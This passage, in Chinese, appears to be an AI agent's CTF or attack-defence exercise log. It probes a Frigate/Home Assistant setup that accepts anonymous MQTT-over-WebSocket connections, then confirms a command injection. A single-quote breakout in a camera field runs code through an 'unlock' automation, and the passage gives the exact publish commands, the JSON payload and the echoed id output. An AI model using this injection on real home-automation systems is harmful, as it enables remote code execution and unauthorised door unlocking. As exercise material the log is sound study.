## 2) MQTT-over-WebSocket 握手 + 匿名连接

本机 pwsh/Python 全部启动失败（exit 3221225794 / 0xC0000142），改用 awd-mcp `run_weapon` 执行自写脚本
`D:\agent\skill\skills\ctf-0day\scripts\ws_mqtt_probe.py`。

命令：

```
python ws_mqtt_probe.py --host <TARGET_HOST> --port <TARGET_PORT> --path /mqtt --topics frigate/#,home/# --wait 8
```

回显（节选）：

```

[CONNACK] return_code=0 (accepted)

```

结论：MQTT 匿名可连（CONNACK rc=0），无需凭据即可订阅 `frigate/+/events`、`home/+/telemetry`。

## 3) 命令注入确认（单引号逃逸）

发布到 `frigate/entry/events`：

```json
{"type":"new","after":{"camera":"entry';id;'","label":"person"}}
```

命令：

```
python ws_mqtt_probe.py --host <TARGET_HOST> --port <TARGET_PORT> --path /mqtt \
  --topics home/# \
  --publish 'frigate/entry/events={"type":"new","after":{"camera":"entry'"'"';id;'"'"'","label":"person"}}' \
  --wait 8
```

遥测回显：

```json
{"camera": "entry';id;'", "stdout": "unlock-ok:unlock --camera entry\nuid=103(homeassistant) gid=105(homeassistant) groups=105(homeassistant),105(homeassistant)\nsh: : Permission denied", "stderr": ""}
```

说明：自动化实际执行形如 `unlock --camera '<camera>'`，单引号闭合后可执行任意命令，输出回显在 `home/a78329b80ed46d03/telemetry`。
`;id`（不加引号）不执行，证明确实是单引号包裹；`$IFS` 用于规避执行器按空格切分参数。
